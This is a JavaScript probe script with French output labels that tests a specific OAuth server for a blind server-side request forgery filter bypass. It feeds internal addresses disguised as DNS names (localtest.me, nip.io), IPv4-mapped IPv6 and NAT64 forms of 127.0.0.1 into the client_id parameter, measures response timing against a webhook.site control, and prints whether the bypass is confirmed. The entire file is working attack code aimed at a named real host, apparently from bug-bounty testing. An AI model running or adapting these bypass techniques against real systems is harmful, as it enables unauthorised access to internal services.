const AS = "https://bugsecure-api.senintel.sn";
const UUID = "3ef992c0-b173-407f-ab55-e3ea613a534a";
const BASE = "https://webhook.site/" + UUID;
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const F = async (url, opt = {}) => { for (let a = 0; a < 3; a++) { try { return await fetch(url, { ...opt, signal: AbortSignal.timeout(25000) }); } catch (e) { await sleep(2000); } } return null; };
const TS = Date.now();

async function measure(url, label) {
  const ts = [];
  for (let i = 0; i < 5; i++) {
    const u = new URL(AS + "/oauth/authorize");
    u.searchParams.set("response_type", "code");
    u.searchParams.set("client_id", url + (url.includes("?") ? "&" : "?") + "i=" + i);
    u.searchParams.set("redirect_uri", BASE + "/cb");
    u.searchParams.set("scope", "programs:read");
    u.searchParams.set("state", "bb");
    u.searchParams.set("code_challenge", "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM");
    u.searchParams.set("code_challenge_method", "S256");
    u.searchParams.set("resource", "https://bugsecure-api.senintel.sn");
    const t0 = Date.now();
    const r = await F(u, { redirect: "manual" });
    if (r) ts.push(Date.now() - t0);
    await sleep(2200);
  }
  ts.sort((a, b) => a - b);
  const min = ts[0] ?? -1, med = ts[Math.floor(ts.length / 2)] ?? -1;
  console.log("  " + label.padEnd(44) + "min=" + String(min + "ms").padStart(7) + " median=" + String(med + "ms").padStart(7) + "  [" + ts.join(",") + "]");
  return { min, med };
}

console.log("=== CONTROURNEMENT DU FILTRE PAR RESOLUTION DNS (nom -> 127.0.0.1) ===");
console.log("  (si le nom donne un profil de latence DIFFERENT de l IP directe => filtre contourne)\n");
const IP = await measure("http://127.0.0.1:3000/", "TEMOIN IP directe 127.0.0.1:3000");
const DNS1 = await measure("http://localtest.me:3000/", "NOM DNS localtest.me:3000 (->127.0.0.1)");
const DNS2 = await measure("http://127.0.0.1.nip.io:3000/", "NOM DNS 127.0.0.1.nip.io:3000");
const DNS3 = await measure("http://localtest.me:9200/", "NOM DNS localtest.me:9200");
const CTRL = await measure("http://192.0.2.1/", "TEMOIN non routable");
const EXT = await measure(BASE + "/x" + TS, "TEMOIN externe (webhook)");
const V6 = await measure("http://[::ffff:127.0.0.1]:3000/", "IPv4-mapped IPv6 ::ffff:127.0.0.1");
const N64 = await measure("http://[64:ff9b:1::7f00:1]:3000/", "NAT64 local-use 64:ff9b:1::7f00:1");

console.log("\n=== VERDICT ===");
const base = EXT.min;
const d = (a, b) => (a && b ? a - b : 0);
console.log("  minimum externe (temoin d un vrai fetch)   : " + base + " ms");
console.log("  minimum IP directe 127.0.0.1:3000          : " + IP.min + " ms  (ecart " + d(base, IP.min) + " ms)");
console.log("  minimum localtest.me:3000 (nom -> 127.0.0.1) : " + DNS1.min + " ms  (ecart " + d(base, DNS1.min) + " ms)");
console.log("  minimum 127.0.0.1.nip.io:3000               : " + DNS2.min + " ms");
console.log("  minimum localtest.me:9200                   : " + DNS3.min + " ms");
console.log("  minimum [::ffff:127.0.0.1]:3000            : " + V6.min + " ms");
console.log("  minimum [64:ff9b:1::7f00:1]:3000           : " + N64.min + " ms");
console.log("  minimum non routable (temoin)                : " + CTRL.min + " ms");
const bypass = DNS1.min > IP.min + 400 || DNS2.min > IP.min + 400 || V6.min > IP.min + 400 || N64.min > IP.min + 400;
console.log("\n  => contournement du filtre par resolution : " + (bypass ? "*** CONFIRME ***" : "non (le filtre couvre aussi les noms resolus)"));
